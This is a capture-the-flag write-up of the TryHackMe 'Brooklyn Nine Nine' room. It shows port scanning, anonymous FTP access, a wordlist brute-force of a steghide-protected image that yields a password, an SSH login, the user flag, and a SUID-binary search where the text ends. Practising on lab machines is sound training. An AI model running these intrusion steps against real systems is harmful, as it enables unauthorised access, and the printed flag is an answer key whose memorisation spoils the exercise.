---
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.
---

# Brooklyn Nine Nine — Writeup

## Overview
### Brooklyn Nine Nine — Writeup
### Brooklyn Nine Nine — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg)
Deploy and get hacking
Start Machine
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.249.1 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.1:22
Open 10.10.249.1:21
Open 10.10.249.1:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 17:55 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Initiating Ping Scan at 17:55
Scanning 10.10.249.1 [2 ports]
Completed Ping Scan at 17:55, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:55
Completed Parallel DNS resolution of 1 host. at 17:55, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:55
Scanning 10.10.249.1 [3 ports]
Discovered open port 22/tcp on 10.10.249.1
Discovered open port 21/tcp on 10.10.249.1
Discovered open port 80/tcp on 10.10.249.1
Completed Connect Scan at 17:55, 0.22s elapsed (3 total ports)
Initiating Service scan at 17:55
Scanning 3 services on 10.10.249.1
Completed Service scan at 17:55, 6.50s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.249.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
NSE: [ftp-bounce 10.10.249.1:21] PORT response: 500 Illegal PORT command.
Completed NSE at 17:55, 8.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 1.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Nmap scan report for 10.10.249.1
Host is up, received syn-ack (0.22s latency).
Scanned at 2022-12-28 17:55:08 EST for 17s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab162e79203c9b0a019c8c4426015804 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```
```text
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.249.1  
Connected to 10.10.249.1.
220 (vsFTPd 3.0.3)
Name (10.10.249.1:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40692|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||26912|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*****************************************************************|   119        1.93 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.42 KiB/s)
ftp> exit
221 Goodbye.
```
```text
┌──(kali㉿kali)-[~]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ wget http://10.10.249.1/brooklyn99.jpg
--2022-12-28 18:22:59--  http://10.10.249.1/brooklyn99.jpg
Connecting to 10.10.249.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg’

brooklyn99.jpg              100%[=========================================>]  68.05K   164KB/s    in 0.4s    

2022-12-28 18:23:00 (164 KB/s) - ‘brooklyn99.jpg’ saved [69685/69685]
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ file brooklyn99.jpg 
brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool brooklyn99.jpg                                         
ExifTool Version Number         : 12.52
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2020:05:26 05:01:39-04:00
File Access Date/Time           : 2022:12:28 18:23:03-05:00
File Inode Change Date/Time     : 2022:12:28 18:23:00-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

so using stegcracker

https://github.com/Paradoxis/StegCracker
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ stegcracker                        
Command 'stegcracker' not found, but can be installed with:
sudo apt install stegcracker
Do you want to install it? (N/y)y
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to "note.txt".
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cat note.txt           
Holts Password:
fluffydog12@ninenine

Enjoy!!

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

so the pass is form holt
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh holt@10.10.249.1 
holt@10.10.249.1's password: fluffydog12@ninenine
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ whoami
holt
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee

privesc

holt@brookly_nine_nine:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root            167K Dec  1  2017 /bin/less
-rwsr-xr-x 1 root   root             43K Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
